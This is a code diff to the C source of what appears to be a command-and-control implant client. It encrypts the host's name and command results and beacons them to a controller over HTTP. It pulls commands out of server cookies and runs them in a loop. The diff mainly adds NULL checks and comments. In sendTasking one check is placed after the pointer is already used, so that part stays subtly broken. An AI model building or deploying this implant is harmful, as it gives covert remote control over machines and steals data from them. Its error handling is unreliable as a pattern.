@@ -38,10 +38,10 @@ void connectTrevor(void)
     unsigned char* endcookie = NULL;
     DEBUG_PRINT("In connectTrevor\n");
     hostname[1023] = '\0';
+    /* NOTE: There's better OS specific functions that you can do 
+     * instead of this*/
     gethostname(hostname, 256);
-    // struct hostent* h;
-    // h = gethostbyname(hostname);
-    // printf("h_name: %s\n", h->h_name);
+    
     if (hostname[0] == 0) {
         memcpy(hostname, "UNKNOWN", strlen("UNKNOWN"));
     }
@@ -54,6 +54,9 @@ void connectTrevor(void)
     sprintf(hostnameString, "magic_hostname=%s", hostname);
     DEBUG_PRINT("HostnameString: %s\n", hostnameString);
     encodedData = calloc(strlen(hostnameString) + 17, 1);
+    if (encodedData == NULL){
+        goto cleanup;
+    }
     /*Figure out padding*/
     padding = 16 - (strlen(hostnameString) % 16);
     DEBUG_PRINT("Padding: %d\n", (int)padding);
@@ -67,23 +70,39 @@ void connectTrevor(void)
         free(encodedData);
         encodedData = NULL;
     }
+    if (outdata == NULL){
+        goto cleanup;
+    }
     DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
     /*Response looks like its always null terminated*/
     encodedData = b64_encode(outdata, outdataLen);
     DEBUG_PRINT("Encoded : %s\n", encodedData);
+    if (encodedData == NULL){
+        goto cleanup;
+    }
+    
     encodedDataWrap
         = b64_encode((unsigned char*)encodedData, strlen(encodedData));
+    if (encodedDataWrap == NULL){
+        goto cleanup;
+    }
+    
     pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
             + strlen(encodedDataWrap) + 1,
         1);
+    if (pathval == NULL){
+        goto cleanup;
+    }
     sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);
+    
 
     response
         = http_request(1, "GET", SERVER_HOSTNAME, 80, NULL, pathval, NULL, 0);
     if (response == NULL) {
         goto cleanup;
     }
-    // DEBUG_PRINT("Response to connectTrevor: %s\n", response);
+    /* NOTE: You can ifdef this out if using wininet/libcurl. 
+     * Pretty much anything that isn't a standard socket */
     cookievalue = (unsigned char*)strstr((char*)response, COOKIE_VALUE);
     if (cookievalue != NULL) {
         DEBUG_PRINT("Got cookie\n");
@@ -100,6 +119,7 @@ void connectTrevor(void)
     } else {
         DEBUG_PRINT("Failed to get cookie\n");
     }
+    
 cleanup:
     if (outdata) {
         free(outdata);
@@ -180,6 +200,7 @@ unsigned char* getTasking(void)
     }
 
     DEBUG_PRINT("Decrypted tasking : %s\n", decryptedtasking);
+    
 cleanup:
     if (response) {
         free(response);
@@ -209,6 +230,7 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     unsigned char* response = NULL;
     DEBUG_PRINT("In sendTasking\n");
     hostname[1023] = '\0';
+    /* NOTE: This doesn't need to be done every time. */
     gethostname(hostname, 1023);
 
     DEBUG_PRINT("Hostname: %s\n", hostname);
@@ -219,6 +241,9 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     sprintf(hostnameString, "%s::::%s", hostname, responseData);
     DEBUG_PRINT("HostnameString: %s\n", hostnameString);
     encodedData = calloc(strlen(hostnameString) + 17, 1);
+    if (encodedData == NULL){
+        goto cleanup;
+    }
     /*Figure out padding*/
     padding = 16 - (strlen(hostnameString) % 16);
     DEBUG_PRINT("Padding: %d\n", (int)padding);
@@ -228,19 +253,29 @@ void sendTasking(unsigned char* responseData, int responseDataLen)
     DEBUG_PRINT("Set padding\n");
     outdata = encrypt_buffer((unsigned char*)encodedData,
         strlen(hostnameString) + padding, &outdataLen);
+    
     if (encodedData) {
         free(encodedData);
         encodedData = NULL;
     }
+    if (outdata == NULL){
+        goto cleanup;
+    }
     DEBUG_PRINT("encrypted buffer len: %d\n", outdataLen);
     /*Response looks like its always null terminated*/
     encodedData = b64_encode(outdata, outdataLen);
+    if (encodedData == NULL){
+        goto cleanup;
+    }
     DEBUG_PRINT("Encoded : %s\n", encodedData);
     encodedDataWrap
         = b64_encode((unsigned char*)encodedData, strlen(encodedData));
     pathval = calloc(strlen(SITE_PATH_QUERY) + 1 + strlen(QUERY_STRING)
             + strlen(encodedDataWrap) + 1,
         1);
+    if (encodedDataWrap == NULL){
+        goto cleanup;
+    }
     sprintf(pathval, "%s?%s%s", SITE_PATH_QUERY, QUERY_STRING, encodedDataWrap);
 
     response = http_request(
@@ -333,7 +368,7 @@ int main(int argc, char* argv[])
         taskingData = getTasking();
         if (taskingData != NULL) {
             DEBUG_PRINT("Tasking: %s\n", taskingData);
-
+            /* NOTE: Since just parsing strings going to throw it in here */
             if (strncmp((char*)taskingData, "nothing", strlen("nothing"))
                 != 0) {
                 commandLocation
